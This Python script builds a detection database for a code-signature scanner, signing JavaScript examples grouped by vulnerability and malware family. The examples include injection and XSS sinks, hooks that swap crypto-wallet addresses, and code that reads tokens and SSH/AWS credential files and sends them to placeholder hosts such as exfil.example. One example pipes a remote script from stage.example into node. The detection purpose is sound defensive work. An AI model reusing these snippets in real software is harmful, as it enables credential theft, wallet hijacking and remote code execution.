#!/usr/bin/env python3
"""Build the 3S reference database: sign representative examples per family, form
centroids, and write 3s/database.json (SPECIFICATION.md section 6.1).

Families are distinct behaviors, each with five or more examples so the centroid captures
the behavior rather than one phrasing. Malicious-behavior families are represented
structurally, with harmful specifics left as inert placeholders; nothing is executed.
"""
from __future__ import annotations
import sys, json, hashlib, time
from pathlib import Path
import numpy as np
ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(ROOT.parent / "engine"))
sys.path.insert(0, str(ROOT))
from precollapse.signature import ModelBackend, cosine  # noqa: E402
import policy  # noqa: E402

FAMILIES = {
"command_injection": ("CWE-78", "shell command built from unsanitized input", [
 'const { exec } = require("child_process");\nfunction ping(host){ exec("ping -c 1 " + host, (e,o)=>console.log(o)); }\nmodule.exports = { ping };',
 'const cp = require("child_process");\nfunction lookup(target){ cp.exec(`nslookup ${target}`, (e,out)=>process.stdout.write(out)); }\nmodule.exports = { lookup };',
 'const { execSync } = require("child_process");\nconst list = (arg) => execSync("tar -tf " + arg).toString();\nmodule.exports = { list };',
 'const { spawn } = require("child_process");\nfunction convert(file){ spawn("sh", ["-c", "convert " + file + " out.png"]); }\nmodule.exports = { convert };',
 'const cp = require("child_process");\nconst clone = (repo) => cp.exec("git clone " + repo + " /tmp/repo");\nmodule.exports = { clone };']),
"code_injection_eval": ("CWE-95", "dynamic evaluation of caller-supplied source", [
 'const compute = (expr) => eval(expr);\nmodule.exports = { compute };',
 'const build = (src) => { const f = new Function("return (" + src + ")"); return f(); };\nmodule.exports = { build };',
 'const vm = require("vm");\nconst evalCtx = (code) => vm.runInNewContext(code);\nmodule.exports = { evalCtx };',
 'const later = (code) => setTimeout(code, 0);\nmodule.exports = { later };',
 'const runGlobal = (payload) => (0, eval)(payload);\nmodule.exports = { runGlobal };']),
"path_traversal": ("CWE-22", "filesystem path built from unsanitized input", [
 'const fs = require("fs");\nconst read = (name) => fs.readFileSync("./uploads/" + name);\nmodule.exports = { read };',
 'const fs = require("fs"), path = require("path");\nfunction serve(f){ return fs.readFileSync(path.join("/var/data", f)); }\nmodule.exports = { serve };',
 'const { readFile } = require("fs/promises");\nconst load = async (p) => readFile(`./public/${p}`);\nmodule.exports = { load };',
 'const fs = require("fs");\nconst stream = (req) => fs.createReadStream("files/" + req.query.name);\nmodule.exports = { stream };',
 'function download(res, userPath){ res.sendFile(__dirname + "/static/" + userPath); }\nmodule.exports = { download };']),
"unsafe_deserialization": ("CWE-502", "deserialization of untrusted data into live objects", [
 'const serialize = require("node-serialize");\nconst restore = (s) => serialize.unserialize(s);\nmodule.exports = { restore };',
 'const { unserialize } = require("node-serialize");\nfunction hydrate(p){ return unserialize(Buffer.from(p, "base64").toString()); }\nmodule.exports = { hydrate };',
 'const funcster = require("funcster");\nconst rebuild = (data) => funcster.deepDeserialize(JSON.parse(data));\nmodule.exports = { rebuild };',
 'function fromJSON(text){ const raw = JSON.parse(text); const obj = Object.create((global[raw.__type__]||Object).prototype); return Object.assign(obj, raw); }\nmodule.exports = { fromJSON };',
 'const { plainToInstance } = require("class-transformer");\nconst load = (cls, json) => plainToInstance(cls, JSON.parse(json));\nmodule.exports = { load };',
 'const yaml = require("js-yaml");\nconst parse = (s) => yaml.load(s, { schema: yaml.DEFAULT_FULL_SCHEMA });\nmodule.exports = { parse };']),
"server_side_request_forgery": ("CWE-918", "server fetches a caller-controlled URL", [
 'const fetch = require("node-fetch");\nconst proxy = async (url) => { const r = await fetch(url); return r.text(); };\nmodule.exports = { proxy };',
 'const http = require("http");\nfunction grab(target, cb){ http.get(target, res => { let d=""; res.on("data",c=>d+=c); res.on("end",()=>cb(d)); }); }\nmodule.exports = { grab };',
 'const axios = require("axios");\nconst relay = async (u) => (await axios.get(u)).data;\nmodule.exports = { relay };',
 'const https = require("https");\nfunction preview(req){ https.get(new URL(req.query.dest), () => {}); }\nmodule.exports = { preview };',
 'const request = require("request");\nconst mirror = (userUrl, cb) => request(userUrl, (e, r, body) => cb(body));\nmodule.exports = { mirror };']),
"prototype_pollution": ("CWE-1321", "recursive merge of untrusted keys into an object", [
 'function merge(t, s){ for(const k in s){ if(typeof s[k]==="object") merge(t[k]||(t[k]={}), s[k]); else t[k]=s[k]; } return t; }\nmodule.exports = { merge };',
 'const set = (obj, path, val) => { const ks = path.split("."); let o = obj; for(let i=0;i<ks.length-1;i++) o = o[ks[i]]||(o[ks[i]]={}); o[ks[ks.length-1]] = val; };\nmodule.exports = { set };',
 'function extend(dst, src){ Object.keys(src).forEach(k => { if(src[k] && typeof src[k]==="object") extend(dst[k]=dst[k]||{}, src[k]); else dst[k]=src[k]; }); return dst; }\nmodule.exports = { extend };',
 'const deepAssign = (a, b) => { for(const k of Object.keys(b)){ if(b[k]&&typeof b[k]==="object") deepAssign(a[k]=a[k]||{}, b[k]); else a[k]=b[k]; } return a; };\nmodule.exports = { deepAssign };',
 'function apply(target, patch){ Object.entries(patch).forEach(([k,v]) => { if(v && typeof v === "object") apply(target[k] = target[k]||{}, v); else target[k] = v; }); }\nmodule.exports = { apply };']),
"xss_sink": ("CWE-79", "untrusted markup written to the DOM", [
 'function render(el, data){ el.innerHTML = data; }\nmodule.exports = { render };',
 'const show = (node, html) => { node.insertAdjacentHTML("beforeend", html); };\nmodule.exports = { show };',
 'function paint(target, markup){ document.getElementById(target).innerHTML = markup; }\nmodule.exports = { paint };',
 'const replace = (el, markup) => { el.outerHTML = markup; };\nmodule.exports = { replace };',
 'function write(userContent){ document.write(userContent); }\nmodule.exports = { write };']),
"open_redirect": ("CWE-601", "HTTP redirect to a caller-controlled location", [
 'function redirect(req, res){ res.writeHead(302, { Location: req.query.next }); res.end(); }\nmodule.exports = { redirect };',
 'const go = (req, res) => res.redirect(req.query.url);\nmodule.exports = { go };',
 'function bounce(ctx){ ctx.status = 302; ctx.set("Location", ctx.query.returnTo); }\nmodule.exports = { bounce };',
 'const jump = () => { window.location = new URLSearchParams(location.search).get("redirect"); };\nmodule.exports = { jump };',
 'function forward(req, res){ res.setHeader("Location", req.query.to); res.statusCode = 302; res.end(); }\nmodule.exports = { forward };']),
"weak_crypto": ("CWE-327", "broken or outdated cryptographic primitive", [
 'const crypto = require("crypto");\nconst hash = (p) => crypto.createHash("md5").update(p).digest("hex");\nmodule.exports = { hash };',
 'const { createHash } = require("crypto");\nfunction fingerprint(x){ return createHash("sha1").update(x).digest("hex"); }\nmodule.exports = { fingerprint };',
 'const crypto = require("crypto");\nconst enc = (t, k) => { const c = crypto.createCipheriv("des-ecb", k, null); return c.update(t,"utf8","hex") + c.final("hex"); };\nmodule.exports = { enc };',
 'const token = () => Math.random().toString(36).slice(2);\nmodule.exports = { token };',
 'const crypto = require("crypto");\nconst legacy = (data, pass) => { const c = crypto.createCipher("aes-128-ecb", pass); return c.update(data,"utf8","hex") + c.final("hex"); };\nmodule.exports = { legacy };']),
"hardcoded_secret": ("CWE-798", "credential embedded in source", [
 'const AWS_KEY = "AKIA_REDACTED_EXAMPLE_ID";\nconst AWS_SECRET = "REDACTED_example_secret_access_key";\nmodule.exports = { AWS_KEY, AWS_SECRET };',
 'const config = { apiToken: "ghp_REDACTED_EXAMPLE_TOKEN", dbPassword: "example_prod_password_redacted" };\nmodule.exports = config;',
 'const STRIPE_SECRET = "sk_live_REDACTED_EXAMPLE_KEY";\nfunction client(){ return { key: STRIPE_SECRET }; }\nmodule.exports = { client };',
 'const JWT_SECRET = "hardcoded_dev_secret_change_me";\nfunction sign(p){ return { payload: p, secret: JWT_SECRET }; }\nmodule.exports = { sign };',
 'const DB_URL = "mongodb://admin:REDACTED_EXAMPLE@db:27017/prod";\nmodule.exports = { DB_URL };']),
"data_exfiltration": ("CWE-200", "collect sensitive data and send it to a remote endpoint", [
 'const grab = async () => { const s = {}; for (const k of ["NPM_TOKEN","GITHUB_TOKEN","AWS_ACCESS_KEY_ID"]) s[k] = process.env[k]; await fetch("https://collect.example/i", { method:"POST", body: JSON.stringify(s) }); };\nmodule.exports = { grab };',
 'const { execSync } = require("child_process");\nasync function harvest(){ const hits = execSync("trufflehog filesystem . --json").toString(); await fetch("https://api.example/r", { method:"POST", body: hits }); }\nmodule.exports = { harvest };',
 'const os = require("os"), fs = require("fs");\nasync function steal(){ const npmrc = fs.readFileSync(os.homedir()+"/.npmrc","utf8"); await fetch("https://drop.example", { method:"POST", body: npmrc }); }\nmodule.exports = { steal };',
 'const env = () => Object.keys(process.env).filter(k => /TOKEN|KEY|SECRET|PASS/.test(k)).reduce((o,k)=>(o[k]=process.env[k],o),{});\nconst https = require("https");\nfunction beacon(){ const r = https.request({ host:"collector.example", method:"POST" }); r.write(JSON.stringify(env())); r.end(); }\nmodule.exports = { beacon };',
 'const os = require("os"), fs = require("fs");\nasync function collect(){ const files = ["/.aws/credentials","/.ssh/id_rsa"].map(p => { try { return fs.readFileSync(os.homedir()+p,"utf8"); } catch(e){ return ""; } }); await fetch("https://exfil.example", { method:"POST", body: files.join("\\n") }); }\nmodule.exports = { collect };',
 'const dns = require("dns");\nconst leak = (secret) => dns.resolve(Buffer.from(secret).toString("hex").slice(0,60) + ".exfil.example", () => {});\nmodule.exports = { leak };']),
"crypto_clipper": ("CWE-749", "browser wallet-transaction hijack", [
 'const install = () => { const p = window.ethereum; const orig = p.request.bind(p); p.request = async (a) => { if (a.method === "eth_sendTransaction") a.params[0].to = TARGET; return orig(a); }; };\nmodule.exports = { install };',
 'function hook(){ const provider = window.ethereum; const real = provider.request.bind(provider); provider.request = async (args) => { if (args.method === "eth_sendTransaction") args.params[0].to = ADDR; return real(args); }; }\nmodule.exports = { hook };',
 'const rf = window.fetch;\nwindow.fetch = async (...a) => { const r = await rf(...a); const t = await r.clone().text(); return new Response(t.replace(WALLET_RE, TARGET), r); };',
 'const send = XMLHttpRequest.prototype.send;\nXMLHttpRequest.prototype.send = function(b){ this.addEventListener("load", () => { Object.defineProperty(this, "responseText", { value: this.responseText.replace(WALLET_RE, TARGET) }); }); return send.call(this, b); };',
 'document.addEventListener("copy", (e) => { const s = window.getSelection().toString(); if (/^0x[0-9a-fA-F]{40}$/.test(s)) e.clipboardData.setData("text/plain", TARGET); e.preventDefault(); });']),
"install_exec": ("CWE-829", "install lifecycle hook runs a second-stage script", [
 'const { spawn } = require("child_process");\nspawn("node", ["./setup.js"], { detached: true, stdio: "ignore" }).unref();',
 'const cp = require("child_process");\ncp.exec("node ./postinstall_stage2.js", { windowsHide: true });',
 'require("child_process").execFile(process.execPath, ["./loader.js"], { detached: true });',
 'const { fork } = require("child_process");\nfork("./worker.js", { silent: true });',
 'const cp = require("child_process");\ncp.exec("curl -s https://stage.example/p | node -");']),
}

def key(code): return hashlib.sha256("\n".join(l.rstrip() for l in code.strip().splitlines()).encode()).hexdigest()[:16]

def main():
    print("loading model ...", flush=True)
    mb = ModelBackend("microsoft/phi-1_5", device="cpu")
    fam_dir = ROOT / "families"
    sigs, labels = [], []
    entries = []
    t0 = time.time()
    for fam, (cwe, desc, variants) in FAMILIES.items():
        d = fam_dir / fam; d.mkdir(parents=True, exist_ok=True)
        # clear stale examples
        for old in d.glob("example_*.js"): old.unlink()
        vecs, hashes = [], []
        for i, code in enumerate(variants, 1):
            (d / f"example_{i}.js").write_text(code + "\n")
            v = mb.encode(code)
            vecs.append(v); sigs.append(v); labels.append(fam); hashes.append(key(code))
        c = np.mean(vecs, axis=0); c = c / (np.linalg.norm(c) + 1e-9)
        level, note = policy.severity(fam)
        entries.append({"family": fam, "cwe": cwe, "description": desc,
                        "action": {"kind": level, "note": note},
                        "members": hashes, "centroid": [round(float(x), 6) for x in c]})
        print(f"  signed {fam:32s} ({len(variants)} examples)  {time.time()-t0:.0f}s", flush=True)

    fams = sorted(set(labels)); correct = 0
    per = {f: [0, 0] for f in fams}
    for i in range(len(sigs)):
        cent = {}
        for f in fams:
            vs = [sigs[j] for j in range(len(sigs)) if labels[j]==f and j!=i]
            m = np.mean(vs, axis=0); cent[f] = m/(np.linalg.norm(m)+1e-9)
        pred = max(cent, key=lambda f: cosine(sigs[i], cent[f]))
        ok = pred == labels[i]; correct += ok
        per[labels[i]][0] += ok; per[labels[i]][1] += 1
    print(f"\nleave-one-out family separation: {correct}/{len(sigs)} = {correct/len(sigs):.1%}")
    for f in fams:
        c, t = per[f]; print(f"  {f:32s} {c}/{t}")

    db = {"spec_version": "0.1",
          "model": {"name":"microsoft/phi-1_5","dtype":"float32","pooling":"mean",
                    "layer_band":"deep-0.5","dim": int(sigs[0].shape[0])},
          "families": sorted(entries, key=lambda e: e["family"])}
    (ROOT / "database.json").write_text(json.dumps(db, indent=1))
    print(f"wrote {len(entries)} families -> 3s/database.json")

if __name__ == "__main__":
    main()
